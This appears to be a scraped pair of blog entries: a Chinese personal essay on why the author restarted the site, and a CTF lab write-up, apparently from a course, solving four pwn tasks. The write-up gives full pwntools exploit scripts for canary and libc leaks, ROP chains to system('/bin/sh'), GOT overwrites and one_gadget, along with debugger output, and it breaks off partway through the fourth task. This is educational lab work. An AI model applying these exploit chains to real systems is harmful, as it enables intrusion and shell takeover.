[{"content":" 1 2 3 建站日期 / Establishment date： June 13th, 2023 复站日期 / Restoring date: October 27th, 2023 为什么重新开始 想说却没说成的话太多了。\n当时建站的目的，是希望能给自己创造一个 Sharing my honest opinion 的空间，但是我的完美主义却始终在阻碍着我的写作。况且我从前很多时候，都很难做到正视自己的情绪，并与之共处。而最后没能说出口的，最终都成为了模糊的梦呓，像是坐在从乌云层俯冲降落的客机，只能在心里回味失重的感觉，却没有办法看到舱外实在的风景。\n而这样的遗忘正在分割我自己。自我像是一面被打碎的镜子，分散在过去的切片里。而了解自己究竟是什么样的人，也一度成为了了困扰我最大的问题。因为这样的忘却就像是拼图中缺失的几块，始终凑不出图画的真迹。在这时候，我又会按照我后来的心境，重新解释我当时的想法。用篡改过的真相当作麻药，企图让自己回避问题的疼痛。\n所以我重新建站是为了什么呢？我想，应该是抵抗这样的遗忘：前几天翻到自己的中学日记，我惊诧于在自己反复重复的历史中表现的惊人的相似，原来自己真的是不长记性，错过一次还能再错，一错再错……以至于我能把自己情绪周期、情感心路发展全部刻画成一套模式。遗忘会让我忘记先前的错误，让我在历史的教训中吸取不到任何的教训。离开母体后的日子里我做过无数次自我剖析，然而它们最后都成了工具，满足我鞭笞自己的欲望罢了，没有对自我成长起到太大正面的作用。\n我讨厌作为交流的文字，但我喜欢作为记录的文字。我希望能用文字作为记录我所思所想的载体，让我在以后能够最大限度地体会在每个阶段里我的所思所想。人格、感情、观点都是流动的，而记录却不会改变。唐太宗曾说“以史为鉴可以知兴替”，他口中的兴替是国家的盛衰之因。我没有那种大国情怀，对我来说回顾往事，更多是希望能够为以后的疑惑给出解决思路。\n还有一个原因是：我需要一个单向的树洞，满足自己的倾诉欲。有段时间我找了很多我根本不熟的人，向他们倾诉了许多我不会给我身边人诉说的我心中恶心而危险的东西，结交了许多了解我很多秘密的陌生人。我现在觉得，干脆把它们写出来算了。个人网站可以很好的满足这一需求。况且搭建的过程也很让我有成就感：当你感觉到自己真的有在做一件有意义的事情，这样的满足、愉悦是无以复加的。\n最后，请允许我介绍一下自己：这里是 dyan，这里是 nepl1t，大学生。利他出于利己，时刻以满足自己的自恋倾向作为最高需求。\n","date":"2023-10-27T08:27:04+08:00","image":"https://s2.loli.net/2023/11/16/5pNg9fCPYueikoW.png","permalink":"https://nepl1t.github.io/p/first/","title":"First"},{"content":" Attention!\n该界面内提到的任何代码与原程序都可在 https://github.com/nepl1t/nepl1t.github.io/tree/master/assets 内找到\nTask1 ropbasic Preparation 首先 checksec 一下程序，保护全开。 ROPgadget 只能找到一个 gadget：\n❯ ROPgadget --binary ./ropbasic --only \u0026quot;pop|ret\u0026quot; Gadgets information ============================================================ 0x00000000000011d3 : pop rbp ; ret 0x000000000000101a : ret Unique gadgets found: 2 嗯，至少找到一个 rbp_ret_addr 是 0x00000000000011d3 了。\n反编译一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int __fastcall main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-114h] char s[264]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v6; // [rsp+118h] [rbp-8h] v6 = __readfsqword(0x28u); initbuf(argc, argv, envp); for ( i = 0; i \u0026lt;= 3; ++i ) { memset(s, 0, 0x100uLL); printf(\u0026#34;input\u0026gt; \u0026#34;); read(0, s, 0x1000uLL); puts(s); } return 0; main() 的逻辑十分简单，每次将 s 开始的连续 0x100 个内存清零，然后输出，read() 0x1000个字节。肯定有栈溢出。\ns 相对 rbp 的偏移地址为 0x110，考虑到程序开了 Canary，因此当务之急就是将其泄漏出来，否则栈溢出泄漏 libc 就无从说起。\nLeaking Canary 根据代码知道，使用 gdb 停到 call memset 时：\n0x555555555264 lea rax, [rbp - 0x110] RAX =\u0026gt; 0x7fffffffd9f0 ◂— 0 0x55555555526b mov edx, 0x100 EDX =\u0026gt; 0x100 0x555555555270 mov esi, 0 ESI =\u0026gt; 0 0x555555555275 mov rdi, rax RDI =\u0026gt; 0x7fffffffd9f0 ◂— 0 ►0x555555555278 call memset@plt \u0026lt;memset@plt\u0026gt; s: 0x7fffffffd9f0 ◂— 0 c: 0 n: 0x100 然后查询 rdi 与 rsp 的值：\n*RDI 0x7fffffffd9f0 ◂— 0 RSP 0x7fffffffd9e0 ◂— 0 那么， 从 rdi （0x7fffffffd9f0）开始依次读取内存数据到 rsp （0x7fffffffdb00）的位置：\npwndbg\u0026gt; x /40gx 0x7fffffffd9f0 0x7fffffffd9f0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda00:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda10:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda20:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda30:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda40:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda50:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda60:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda70:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda80:\t0x0000000000000000\t0x0000000000000000 0x7fffffffda90:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdaa0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdab0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdac0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdad0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdae0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdaf0:\t0x0000000000000000\t0xe719bae42bbeac00 0x7fffffffdb00:\t0x0000000000000001\t0x00007ffff7c29d90 0x7fffffffdb10:\t0x0000000000000000\t0x0000555555555230 0x7fffffffdb20:\t0x0000000100000000\t0x00007fffffffdc18 pwndbg\u0026gt; 考虑到 memset() 函数在这里只清空了 0x100 的数据 （一直到 0x7fffffffdaf0: 0x0000000000000000 ） ，而 0x7fffffffdaf8: 0xe719bae42bbeac00 ，这是一个 0x00 作结尾的数据，可以推测这就是 Canary，关于 s 的偏移值为 0x108。\n1 2 3 4 5 6 7 conn.recv(0x7) #0x7 bytes: b\u0026#39;input\u0026gt; \u0026#39; offset = b\u0026#39;A\u0026#39;*(0x108) conn.send(offset + b\u0026#39;B\u0026#39;) conn.recv(0x108) Canary = u64(conn.recv(0x8)) - 0x42 conn.recv(0x9) log.info(\u0026#34;Canary:\u0026#34;+hex(Canary)) 运行效果如下：\n[DEBUG] Received 0x7 bytes: b\u0026apos;input\u0026gt; \u0026apos; [DEBUG] Sent 0x109 bytes: b\u0026apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB\u0026apos; [DEBUG] Received 0x119 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 00000100 41 41 41 41 41 41 41 41 42 9f 7e 4b 15 b6 3e f9 │AAAA│AAAA│B·~K│··\u0026gt;·│ 00000110 01 0a 69 6e 70 75 74 3e 20 │··in│put\u0026gt;│ │ 00000119 [*] Canary:0xf93eb6154b7e9f00 得到 Canary 为 0xf93eb6154b7e9f00\n程序没有检测到栈溢出，而是正常退出，这说明 Canary 成功泄漏并绕过了。\nLeaking libc addr 由于开了 PIE，每次运行的基址都不一样，所以每次栈溢出 ROP 之前，都需要得到 libc 的地址。通过 objdump -d 可以发现程序里确实是有 libc_start_main() 的符号，我们可以找到它的地址，再减去其在 libc 中的偏移地址，从而得到 libc 地址。\n首先，动态调试时（此时正在 read() 函数内）看到如下信息：\n─────────────────────────[ BACKTRACE ]────────────────────────── ► 0 0x55555555526b 1 0x7ffff7c29d90 2 0x7ffff7c29e40 __libc_start_main+128 3 0x555555555125 因此可以判定， 0x55555555526b （作为 read() 函数的返回地址）位于 main() 内，因此 0x7ffff7c29d90 就是 main() 函数执行完后的返回地址。\n注意到 0x7ffff7c29e40 （ 相对 0x7ffff7c29d90 是 0xb0）相对于 __libc_start_main() 的偏移值是 0x80 (128) ，因此可以得到 main() 的返回地址相对于 __libc_start_main() 的偏移值是 0x30 。通过前面栈溢出得到 main() 的返回地址后，我们就可以得到__libc_start_main() 的实际地址。\n通过如下的 python 脚本，可以得到 libc 的地址：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Leaking libc address __libc_start_main_offset = libc.symbols[\u0026#39;__libc_start_main\u0026#39;] # pause() conn.send(offset + b\u0026#39;AABBCCDDEEFFGGHH\u0026#39;) #0x108 + 0x8 + 0x8 = 0x118 conn.recv(0x118) received = conn.recvline() #后面一个 \u0026#39;\\ninput\u0026gt; \u0026#39; (printf的内容) conn.recv(0x7) received = received.strip(b\u0026#39;\\n\u0026#39;) received = received.ljust(8, b\u0026#39;\\0\u0026#39;) print(received) # pause() main_return_addr = u64(received) log.info(\u0026#34;waitwhat? \u0026#34; + hex(main_return_addr)) __libc_start_main_addr = main_return_addr + 0x30 libc_addr = __libc_start_main_addr - __libc_start_main_offset log.info(\u0026#34;main_return_addr: {:016X}\u0026#34;.format(main_return_addr)) log.info(\u0026#34;__libc_start_main_addr:{:016X}\u0026#34;.format(__libc_start_main_addr)) log.info(\u0026#34;libc_addr: {:016X}\u0026#34;.format(libc_addr)) 运行效果如下：\n[DEBUG] Sent 0x118 bytes: b\u0026apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDEEFFGGHH\u0026apos; [DEBUG] Received 0x126 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 00000100 41 41 41 41 41 41 41 41 41 41 42 42 43 43 44 44 │AAAA│AAAA│AABB│CCDD│ 00000110 45 45 46 46 47 47 48 48 90 9d c2 42 38 77 0a 69 │EEFF│GGHH│···B│8w·i│ 00000120 6e 70 75 74 3e 20 │nput│\u0026gt; │ 00000126 b\u0026apos;\\x90\\x9d\\xc2B8w\\x00\\x00\u0026apos; [*] waitwhat? 0x773842c29d90 [*] main_return_addr: 0000773842C29D90 [*] __libc_start_main_addr:0000773842C29DC0 [*] libc_addr: 0000773842C00000 得到 libc 的地址为 0x0000773842C00000\nGetting system shell 已经知道了 libc 的地址，那就从 libc 里面找 gadget：ROPgadget --binary ./libc.so.6 --only \u0026quot;pop|ret\u0026quot;\n需要找一个 rdi_ret 与一个单独的 ret ，但是单独的 ret 空转的原因，上网说是因为ubuntu18及以上在调用system函数的时候会先进行一个检测，如果此时的栈没有16字节对齐的话，就会强行把程序crash掉，所以需要栈对齐 ，但我并没有看懂。无论如何，在 libc 里面找到了这样两个 gadgets：\n0x000000000002a3e5 : pop rdi ; ret 0x0000000000029139 : ret 然后像下面这样构造 payload ，就可以直接获取 shell 了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Getting system shell ret_addr = 0x0000000000029139 + libc_addr rdi_rtn_addr = 0x000000000002a3e5 + libc_addr system_addr = libc.symbols[\u0026#39;system\u0026#39;] + libc_addr #system函数的地址 bin_sh_addr = next(libc.search(\u0026#39;/bin/sh\u0026#39;)) + libc_addr #‘/bin/sh’的地址 payload = offset + p64(Canary) + b\u0026#39;AABBCCDD\u0026#39; + p64(ret_addr) + p64(rdi_rtn_addr) + p64(bin_sh_addr) + p64(system_addr) log.info(\u0026#34;system_addr:{:016X}\u0026#34;.format(system_addr)) log.info(\u0026#34;bin_sh_addr:{:016X}\u0026#34;.format(bin_sh_addr)) # pause() conn.send(payload) conn.recv(0x110) conn.send(payload) conn.recv(0x110) conn.interactive() 运行效果如下：\n成功获得 flag 为 AAA{oh_R0P_1s_b4b@b4b@s1c~}\nApproach 2 ORW ORW 即 open(file, olfag) read(fd, buf, n_bytes) 与 write(fd, buf, n_bytes) 。\n所以要用 rdi 对应文件地址 file 用于 open， 对应 fd 项用于 read 与 write：在ORW中，我们需要设置 read 的 fd 为 3，表示从文件中读取，write的 fd 还是如常，依旧为 1 ；\n用 rsi 对应 oflag 用于 open （由于只用读取就行了所以取 0 ），对应 buf 用于 read 与 write；\n最后用 rdx 对应 n_bytes 用于 read 与 write 。\n我们先前已经找到了 pop_rdi_ret 的 gadget了，接着找 rsi 与 rdx 的 ：\n1 2 0x000000000011f2e7 : pop rdx ; pop r12 ; ret 0x000000000002be51 : pop rsi ; ret 所以对于调用 open(rdi -\u0026gt; \u0026quot;./flags.txt\u0026quot;, rsi -\u0026gt; 0) ，我们可以将栈写成这个样子：\npop_rdi_ret_addr \u0026quot;./flags.txt\u0026quot; pop_rsi_ret 0x00000000 open_addr 对于调用 read(rdi -\u0026gt; 3, rsi -\u0026gt; oflag) ，\nTask2 onerop 本题目的完整代码为 attachment 中的 pwnlab2_task2_code.py\nPreparation \u0026amp; Leaking libc addr checksec 一下，没有开 PIE 与 Canary，感觉比第一题友好多了，用 IDA 编译出来的 main() 也是十分简单：\n1 2 3 4 5 6 7 8 9 10 int __fastcall main(int argc, const char **argv, const char **envp) { __int64 buf[32]; // [rsp+0h] [rbp-100h] BYREF initbuf(argc, argv, envp); memset(buf, 0, sizeof(buf)); read(0, buf, 0x1000uLL); puts((const char *)buf); return 0; } 0x100 长的内存却给了 0x1000 的读入，妥妥的栈溢出。\n用 ROPgadget 一看，甚至题目本身就有一些好用的 gadget：\n0x00000000004011c5 : pop rdi ; ret 0x000000000040101a : ret 0x0000000000401181 : retf 再者，用 seccomp-tools dump 查看，发现程序没有开启沙箱，可以考虑 get shell 了。现在要做的就是泄漏 libc 基址，然后使用 libc 的 system(/bin/sh) 获取 shell 控制权。\n同时，使用 gdb 动态调试，在 Backtrace 栏中发现\n─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► 0 0x40131a main+336 1 0x7ffff7c2a1ca __libc_start_call_main+122 2 0x7ffff7c2a28b __libc_start_main+139 3 0x4010b5 _start+37 所以一开始的思路，就是利用栈溢出让 puts() 函数输出 main() 的返回地址（关于 __libc_start_call_main 的偏移地址是 +122），而 __libc_start_call_main 相对于 __libc_start_main 的偏移地址是 -0xB0 ，可以因此求出 __libc_start_main 的实际地址，然后求得 libc 的地址。但是由于没有循环，且正常流程只能进行一次输入，所以首次输入（尚不知道 libc 地址）就要构造 ROP 链使得 main() 返回到它自身，然后在第二次输入（此时已经知道 libc 地址）构造 ROP 链以获取 shell 控制权。\n看起来很好，但是失败了——最后程序没有像设想的打开 shell，而是报段错误退出。为什么呢？ Debug 后发现，我们在第一次输入时为了让 main() 返回到它自身，肯定要把原来 main() 的返回地址覆盖掉，所以我们用 puts() 函数输出的，其实是 main() 的地址，而不是__libc_start_call_main + 122 ，这个思路错了。\n既然不能泄漏 main() 原来的返回地址，那就泄漏 main() 调用过的函数。看了一堆作题笔记后，发现 puts() 比较好弄：\n我们第一次输入前，先求 puts() 的 plt 与 got 地址（因为 glibc 的延迟绑定机制），然后通过第一次输入把栈覆写成这个形式：\npop_rdi_ret_addr puts_got puts_plt main_addr 这样，我们在第一次输出后，main() 函数 return （执行第一个 ret 时 rbp 指向 pop_rdi_ret_addr ）到 pop rdi; ret; 的 gadget， 就可以将 puts() 的实际地址（在 GOT 表内，所以是 puts_got ）作为参数传给 rdi ，然后再次 return （执行第二个 ret 时 rbp 指向 puts_plt ）到 puts() 函数从而输出它自己的实际地址，然后再 return 到 main() 函数。我们就可以用 puts() 函数的地址求 libc 的地址了。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Step one Leaking puts() address \u0026amp; return to main() again main_addr = 0x00000000004011CA ret_addr = 0x000000000040101a rdi_ret_addr = 0x00000000004011c5 puts_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_offsets = libc.symbols[\u0026#39;puts\u0026#39;] offset = 0x100 + 0x8 payload1 = b\u0026#39;A\u0026#39;*offset + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) # pause() conn.send(payload1) # conn.interactive(); conn.recvline() #first puts() received1 = conn.recvline() #second puts() outputs its addr received1 = received1.strip(b\u0026#39;\\n\u0026#39;) received1 = received1.ljust(8, b\u0026#39;\\0\u0026#39;) puts_addr = u64(received1) libc_addr = puts_addr - puts_offsets log.info(\u0026#34;puts_addr =\u0026gt; \u0026#34;+ hex(puts_addr)) log.info(\u0026#34;libc_addr =\u0026gt; 0x{:016X}\u0026#34;.format(libc_addr)) 效果如下：\n可以看到获取的 libc 地址为 0x00007F6506C9D000\nGetting system shell 最后，按如下构造 payload ，可以获取 shell：\n1 2 3 4 5 6 7 8 9 # Step two Getting system shell system_addr = libc.symbols[\u0026#39;system\u0026#39;] + libc_addr #system函数的地址 bin_sh_addr = next(libc.search(\u0026#39;/bin/sh\u0026#39;)) + libc_addr #‘/bin/sh’的地址 log.info(\u0026#34;bin_sh_addr =\u0026gt; {:016X}\u0026#34;.format(bin_sh_addr)) log.info(\u0026#34;system_addr =\u0026gt; {:016X}\u0026#34;.format(system_addr)) payload2 = b\u0026#39;A\u0026#39;*offset + p64(ret_addr) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr) # pause() conn.send(payload2) conn.interactive() 运行后效果如下：\n得到 flag 为 AAA{r0p_oN3_5Im3_ROP_f0r3ve3}\nTask3 onefsb 本题目的完整代码为 attachment 中的 pwnlab2_task3_code.py\nPreparation checksec 一下，是关闭了 PIE 保护，同时打开的 Partial RELRO 的 64 位程序，注意到开了 Canary，栈溢出要小心点。\nIDA 反编译一下，main() 基本逻辑是这样的：\n1 2 3 4 5 6 7 8 9 10 11 char s[8]; // [rsp+0h] [rbp-110h] BYREF unsigned __int64 v36; // [rsp+108h] [rbp-8h] v36 = __readfsqword(0x28u); // 设置 Canary initbuf(argc, argv, envp); printf(\u0026#34;what\u0026#39;s your message: \u0026#34;); memset(s, 0, 0x100) // 将 [rbp-110h] 开始到 [rbp-11h] 共 256 个字节的内存清零 fgets(s, 255, stdin); // 从 s 开始输入 255 256 个字节 printf(s); puts(\u0026#34;bye\u0026#34;); return 0; 做这题的时候，我首先想到利用 FSB Bug ，使用类似于前两道 Task 的思路，先泄漏 main() 的返回地址从而获得 libc 地址，如果不方便获得 main() 的返回地址，就想办法泄漏其他函数的地址，然后利用 ROP 将程序 return 到 system('/bin/sh') 上，但是实际操作时遇到了只有一次利用 FSB 的机会，若劫持控制流就不能泄漏 main() 的返回地址 ，然后是 printf() 使用 %u 写入时导致段错误，以及直接写 ROP 链太麻烦等各种困难\n然后就是（请求场外援助 sad 后得到的 hint） Partial RELRO ，它允许我们能够覆写 GOT 表，可不可以获取 system 的 GOT 表地址将其覆盖到 main() 要调用的一个函数在 GOT 表上的地址从而达到调用 system(\u0026quot;/bin/sh\u0026quot;) 的机会？结果也不行，一次利用 FSB 的限制不能让我做到这一点。那能不能用覆写 GOT 表从而做到无限利用 FSB ? 等等，main() 结束前怎么有一个 puts(\u0026quot;bye\u0026quot;) ，豁然开朗了：把 puts_got 变成 main() ，这样就让做完恶作剧的小鬼程序被狠狠脑控定身任我为非作歹 😡😡😡 ；至于 ROP 链，换成一个 one_gadget ，在这里找到的是这个：\n0xebc85 execve(\u0026quot;/bin/sh\u0026quot;, r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL || r10 is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp 在第一次 payload，要做的就是：劫持控制流，将 puts_got 覆写成 main() ，让程序想 \u0026ldquo;bye\u0026rdquo; 却被我狠狠脑控当场拿下\n第二次，输出 printf() 地址从而获取 libc 地址，从而获得 one_gadget 的地址\n第三次，就是将 puts_got 覆写成 one_gadget ，对我言听计从 😤😤😤\nGetting offsets 首先打开程序，确定格式化字符串的相对偏移。打开程序，输入 AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p ，结果如下：\n可以看到， AAAAAAAA ，即 0x4141414141414141 位于格式化字符串后的第六个偏移。\n使用 gdb 调试， 输入 AAAAAAAA 后断点在 printf() 内，然后看栈内容，结果如下：\npwndbg\u0026gt; x /40gx $rsp 0x7fffffffdac8:\t0x000000000040139e\t0x4141414141414141 0x7fffffffdad8:\t0x000000000000000a\t0x0000000000000000 0x7fffffffdae8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdaf8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb08:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb18:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb28:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb38:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb48:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb58:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb68:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb78:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb88:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdb98:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdba8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdbb8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdbc8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdbd8:\t0xf53edbb42f9f1d00\t0x0000000000000001 0x7fffffffdbe8:\t0x00007ffff7c29d90\t0x0000000000000000 0x7fffffffdbf8:\t0x00000000004011fd\t0x0000000100000000 pwndbg\u0026gt; p $rbp $3 = (void *) 0x7fffffffdbe0 pwndbg\u0026gt; p $rsp $4 = (void *) 0x7fffffffdac8 可以看到，输入的格式字符串 AAAAAAAA 位于栈的第二位，由于此时位于 printf() 函数内， 栈的最顶部 rbp 指向的是 printf() 的返回地址，所以不算做参数，同时由于是 64 位程序，前六个参数在寄存器内，所以格式字符串就是 printf() 的第七个参数，也就是格式化字符串（ rdi ）后的第六个偏移。\nHijacking control flow 首先就是拿下 puts() ，像这样构建 payload ：\n1 2 3 4 5 6 7 8 9 10 context(arch = \u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] printf_offset = libc.symbols[\u0026#39;printf\u0026#39;] # pause() main_addr = 0x4011fd payload = fmtstr_payload(6,{puts_got:main_addr},write_size=\u0026#34;short\u0026#34;) conn.sendlineafter(b\u0026#34;what\u0026#39;s your message: \u0026#34;, payload) conn.interactive() 运行，结果如下：\nLeaking libc address 有了前面两道 Task 的经验，这次 leak 可以算很顺利了：\n1 2 3 4 5 6 7 8 9 10 11 # Second payload: leaking libc address payload2 = b\u0026#39;%7$sKKKK\u0026#39; + p64(printf_got) conn.sendlineafter(b\u0026#34;what\u0026#39;s your message: \u0026#34;, payload2) recv = conn.recvuntil(b\u0026#39;KKKK\u0026#39;) recv = recv.strip(b\u0026#39;KKKK\u0026#39;) recv = recv.ljust(8,b\u0026#39;\\0\u0026#39;) printf_addr = u64(recv) libc_addr = printf_addr - printf_offset log.success(\u0026#34;printf_addr =\u0026gt; 0x{:016X}\u0026#34;.format(printf_addr)) log.success(\u0026#34;libc_addr =\u0026gt; 0x{:016X}\u0026#34;.format(libc_addr)) conn.interactive() 运行结果如下：\n可以看到最终得到的 libc 地址为 0x00007F3EDFC00000\nGetting system shell 1 2 3 4 5 6 7 8 # Third payload: getting system shell pop_rdi_addr = 0x000000000002a3e5 + libc_addr bin_sh_addr = next(libc.search(\u0026#39;/bin/sh\u0026#39;)) + libc_addr system_addr = libc.symbols[\u0026#39;system\u0026#39;] + libc_addr one_gadget = 0xebc85 + libc_addr payload3 = fmtstr_payload(6,{puts_got:one_gadget}) conn.sendlineafter(b\u0026#34;what\u0026#39;s your message: \u0026#34;, payload3) conn.interactive() 运行效果如下：\n成功获取 shell 的控制权。最终得到 flag 为 AAA{i_l0v3_fmtstr_payload_H0p3_u_Loveit_2} ，然而我自我感觉也许可能不会很 love it :D 卡了我两天（怨）\nTask4 fsb-stack 本题目的完整代码为 attachment 中的 pwnlab2_task4_code.py\nPreparation checksec 一下，除了 Canary 以外保护全开（在 IDA 里反汇编也没看到 stack_check_fail ）。 main() 反编译后的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __fastcall __noreturn main(int argc, const char **argv, const char **envp) { __int64 s[66]; // [rsp+0h] [rbp-210h] BYREF s[65] = __readfsqword(0x28u); initbuf(argc, argv, envp); memset(s, 0, 512); while ( 1 ) { memset(s, 0, 0x200uLL); fgets((char *)s, 512, stdin); printf((const char *)s); } } 自带无限次使用次数的 FSB 。打开程序，输入 AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p 确认格式字符串偏移，结果如下：\n可以看到 AAAAAAAA 位于格式字符串后第六个偏移。\n目前的想法就是，通过 printf() 泄漏出 main() 的返回地址得到 libc 地址。\n但是打开了 FULL RELRO ，不能覆写 GOT 表，所以试试 ROP，利用格式字符串任意位置泄漏栈地址，然后利用任意写将 printf() 的返回地址设为 one_gadget。\nLeaking libc address 通过 gdb 动态调试，断点进入 printf() 内，在栈中寻找到 main() 的返回地址相对于格式字符串的偏移位置。首先来看 Backtrace ，确定 printf() 的返回地址为 0x55555555528d ，位于 main() 内，则 main() 的返回地址为 0x7ffff7c29d90 ，而 0x7ffff7c29e40 相对 __libc_start_main 的偏移是 +128 ，所以 __libc_start_main 相对 main() 的返回地址 的偏移是 (-0xd90 + 0xe40) - 128 = +0x30 。\n─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► 0 0x7ffff7c606f0 printf 1 0x55555555528d 2 0x7ffff7c29d90 3 0x7ffff7c29e40 __libc_start_main+128 4 0x5555555550e5 ──────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; 接下来，在栈中找到 0x7ffff7c29d90 相对于格式字符串的偏移位置：\n──────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; x /100gx $rsp 0x7fffffffd9c8:\t0x000055555555528d\t0x7944734973696854 0x7fffffffd9d8:\t0x7375446c65674e41\t0x000000000a726574 0x7fffffffd9e8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffd9f8:\t0x0000000000000000\t0x0000000000000000 \u003c Skipped \u003e 0x7fffffffdbc8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdbd8:\t0x5b70ffa5294da700\t0x0000000000000001 0x7fffffffdbe8:\t0x00007ffff7c29d90\t0x0000000000000000 0x7fffffffdbf8:\t0x00005555555551f0\t0x0000000100000000 \u003c Skipped \u003e 0x7fffffffdcb8:\t0x00005555555550c0\t0x00007fffffffdcf0 0x7fffffffdcc8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdcd8:\t0x00005555555550e5\t0x00007fffffffdce8 pwndbg\u0026gt; 可以看到， 0x00007ffff7c29d90 位于 0x7fffffffdbe8 处，而 rsp 指向 0x7fffffffd9c8 ，所以在栈中是第 69 位，因此就是格式字符串的第 73 位参数。事实上，若在调试时输入 %73$016llx ，程序确实会输出 00007ffff7c29d90 ，符合要求。\n编写下面的 python 代码以获取 libc 基址：\n1 2 3 4 5 6 7 8 9 10 11 # First payload: leaking libc address payload1 = b\u0026#39;%73$016l\u0026#39; + b\u0026#39;lxKKKKKK\u0026#39; conn.sendline(payload1) recv = conn.recvuntil(b\u0026#39;KKKKKK\u0026#39;) recv = recv.strip(b\u0026#39;KKKKKK\u0026#39;) main_ret_addr = int(recv, 16) __libc_start_main_addr = main_ret_addr + 0x30 libc_addr = __libc_start_main_addr - libc.symbols[\u0026#39;__libc_start_main\u0026#39;] log.success(\u0026#34;main_ret_addr =\u0026gt; 0x{:016X}\u0026#34;.format(main_ret_addr)) log.success(\u0026#34;libc_addr =\u0026gt; 0x{:016X}\u0026#34;.format(libc_addr)) conn.interactive() 运行结果如下：\n获得 libc 地址为 0x000079FB95A00000\nLeaking stack address 由于栈之间的相对偏移应该不变，所以应该可以通过找到一个链：栈上一个位置 A ，其指向栈的另一个位置 B ，找到 A 、 B 其关于格式字符串的偏移位置。然后利用 printf() %x 向 B 的地址漏出来，因此就可以找出 rsp 的地址，最后就可以将 printf_ret_addr 改写成 one_gadget。\n在一次动态调试中，我注意到了这样一个可以存在的链（注意红色字）：\npwndbg\u0026gt; x /110gx $rsp 0x7fffffffd9c8:\t0x000055555555528d\t0x654a6568546e7552 0x7fffffffd9d8:\t0x0000000a736c6577\t0x0000000000000000 \u003c skipped \u003e 0x7fffffffdbc8:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdbd8:\t0xdf6e9e6f3d379b00\t0x0000000000000001 0x7fffffffdbe8:\t0x00007ffff7c29d90\t0x0000000000000000 0x7fffffffdbf8:\t0x00005555555551f0\t0x0000000100000000 0x7fffffffdc08:\t0x00007fffffffdcf8\t0x0000000000000000 